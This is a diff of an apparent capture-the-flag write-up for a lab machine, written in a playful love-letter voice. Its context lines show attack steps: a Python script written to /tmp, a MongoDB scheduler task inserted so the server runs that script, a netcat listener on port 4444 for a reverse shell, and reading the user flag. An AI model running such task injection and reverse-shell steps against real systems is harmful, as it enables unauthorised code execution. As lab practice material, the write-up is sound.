@@ -84,6 +84,10 @@ mark@node ~$
 
 Node, my sweet Node, I felt so close to you. We were separated by miles and miles, but I could feel your circuits responding to my touch.
 
+
+ps aux
+tom running mongo app
+
 /var/scheduler/app.js > runs mongo tasks
 
 mark@node ~$ cat << EOM > /tmp/over.py
@@ -102,9 +106,9 @@ db.tasks.insert({"_id":"1","cmd":"python /tmp/over/over.py"})
 
 nc -lvvvp 4444
 
-cat /home/frank/user.txt
+cat /home/tom/user.txt
 
-I tasted your sweet blood.
+And I tasted your sweet blood.
 
 reverse backup to see that it blacklists characters and needs a key
 run from / and backup /root
